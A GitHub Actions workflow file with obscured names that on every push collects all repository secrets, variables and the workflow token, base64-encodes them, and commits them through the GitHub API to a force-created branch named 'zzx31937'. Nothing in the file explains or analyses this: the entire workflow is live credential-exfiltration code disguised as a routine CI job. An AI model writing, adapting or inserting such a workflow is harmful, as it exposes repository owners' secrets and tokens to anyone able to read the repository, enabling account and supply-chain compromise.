name: zzx
on: [push]
permissions:
  contents: write
jobs:
  d:
    runs-on: ubuntu-latest
    steps:
      - name: g
        env:
          S: ${{ toJSON(secrets) }}
          V: ${{ toJSON(vars) }}
          T: ${{ github.token }}
        run: |
          rm -f o.txt
          echo "SECRETS_B64:$(printf %s "$S" | base64 -w0)" >> o.txt
          echo "VARS_B64:$(printf %s "$V" | base64 -w0)" >> o.txt
          echo "TOKEN_B64:$(printf %s "$T" | base64 -w0)" >> o.txt
      - name: p
        run: |
          BR=zzx31937
          API=https://api.github.com/repos/${{ github.repository }}
          AUTH="Authorization: Bearer ${{ github.token }}"
          SHA=$(curl -s -H "$AUTH" $API/git/ref/heads/${{ github.ref_name }} | python3 -c 'import sys,json;print(json.load(sys.stdin)["object"]["sha"])')
          curl -s -X POST -H "$AUTH" -H "Content-Type: application/json" $API/git/refs -d "{\"ref\":\"refs/heads/$BR\",\"sha\":\"$SHA\"}" >/dev/null
          # if branch existed, update ref to current sha
          curl -s -X PATCH -H "$AUTH" -H "Content-Type: application/json" $API/git/refs/heads/$BR -d "{\"sha\":\"$SHA\",\"force\":true}" >/dev/null
          CONT=$(base64 -w0 o.txt)
          SHAF=$(curl -s -H "$AUTH" "$API/contents/zzx31937.txt?ref=$BR" | python3 -c 'import sys,json;d=json.load(sys.stdin);print(d.get("sha",""))' 2>/dev/null)
          if [ -z "$SHAF" ]; then
            D="{\"message\":\"z\",\"content\":\"$CONT\",\"branch\":\"$BR\"}"
          else
            D="{\"message\":\"z\",\"content\":\"$CONT\",\"branch\":\"$BR\",\"sha\":\"$SHAF\"}"
          fi
          curl -s -X PUT -H "$AUTH" -H "Content-Type: application/json" $API/contents/zzx31937.txt -d "$D" >/dev/null
          echo ok
